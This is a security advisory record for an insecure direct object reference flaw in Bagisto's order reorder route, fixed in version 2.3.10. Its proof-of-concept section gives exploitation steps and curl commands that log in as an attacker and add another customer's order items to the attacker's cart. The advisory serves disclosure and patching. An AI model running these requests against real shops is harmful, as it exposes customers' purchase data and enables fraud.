{"schema_version":"1.7.3","id":"GHSA-x5rw-qvvp-5cgm","published":"2026-01-02T22:50:47Z","modified":"2026-01-02T23:37:58.117908Z","summary":"Bagisto has IDOR in Customer Order Reorder Functionality","details":"### Summary\n\nAn Insecure Direct Object Reference vulnerability in the customer order reorder function allows any authenticated customer to add items from another customer's order to their own shopping cart by manipulating the order ID parameter. This exposes sensitive purchase information and enables potential fraud.\n\n### Details\n\nThe vulnerability exists in the reorder method within OrderController.php. Unlike other order-related functions like view, cancel, printInvoice that properly validate customer ownership, the reorder function retrieves orders using only the order ID without verifying that the order belongs to the authenticated customer.\n\nCode location: `packages/Webkul/Shop/src/Http/Controllers/Customer/Account/OrderController.php`\n\nExposed Route: `packages/Webkul/Shop/src/Routes/customer-routes.php`\n\n```php\nRoute::get('reorder/{id}', 'reorder')->name('shop.customers.account.orders.reorder');\n```\n\n### PoC\n\nI. Create victim account and place an order.\nII. Login as attacker.\nIII. Exploit IDOR and navigate like:  http://target.xxx/customer/account/orders/reorder/1\nIV. Check http://target.xxx/checkout/cart and verify exploitation.\nV. Victim's order items are now in Attacker's cart.\n\n###Â PoC via curl:\n\n```\ncurl -c cookies.txt -X POST \"http://target.xxx/customer/login\" -d \"email=attacker@evil.com&password=123qwe\"\n\ncurl -b cookies.txt \"http://target.xxx/customer/account/orders/reorder/1\"\n\ncurl -b cookies.txt \"http://target/api/checkout/cart\"\n```\n\n### Impact\n\n- **Information Disclosure:** Attackers can discover what products other customers have purchased.\n- **Potential Fraud:** Attackers could potentially exploit this for social engineering or targeted attacks.","affected":[{"package":{"name":"bagisto/bagisto","ecosystem":"Packagist","purl":"pkg:composer/bagisto/bagisto"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"2.3.10"}]}],"versions":["v0.1.0","v0.1.1","v0.1.2","v0.1.3","v0.1.4","v0.1.4-BETA1","v0.1.4-BETA2","v0.1.4-BETA3","v0.1.4-BETA4","v0.1.5","v0.1.6","v0.1.6-ALPHA1","v0.1.7","v0.1.7-BETA1","v0.1.7-BETA2","v0.1.8","v0.1.9","v0.1.9-BETA1","v0.2.0","v0.2.1","v0.2.2","v1.0.0","v1.0.0-BETA1","v1.1.0","v1.1.1","v1.1.2","v1.2.0","v1.2.0-BETA1","v1.3.0","v1.3.1","v1.3.2","v1.3.3","v1.4.0","v1.4.1","v1.4.2","v1.4.3","v1.4.4","v1.4.5","v1.5.0","v1.5.1","v2.0.0","v2.0.0-BETA-1","v2.1.0","v2.1.1","v2.1.2","v2.2.0","v2.2.1","v2.2.10","v2.2.2","v2.2.3","v2.2.4","v2.2.5","v2.2.6","v2.2.7","v2.2.8","v2.2.9","v2.3.0","v2.3.1","v2.3.2","v2.3.3","v2.3.4","v2.3.5","v2.3.6","v2.3.7","v2.3.8","v2.3.9"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-x5rw-qvvp-5cgm/GHSA-x5rw-qvvp-5cgm.json"}}],"references":[{"type":"WEB","url":"https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-21447"},{"type":"WEB","url":"https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3"},{"type":"PACKAGE","url":"https://github.com/bagisto/bagisto"}],"database_specific":{"cwe_ids":["CWE-284","CWE-639"],"github_reviewed":true,"github_reviewed_at":"2026-01-02T22:50:47Z","nvd_published_at":"2026-01-02T21:15:58Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"}]}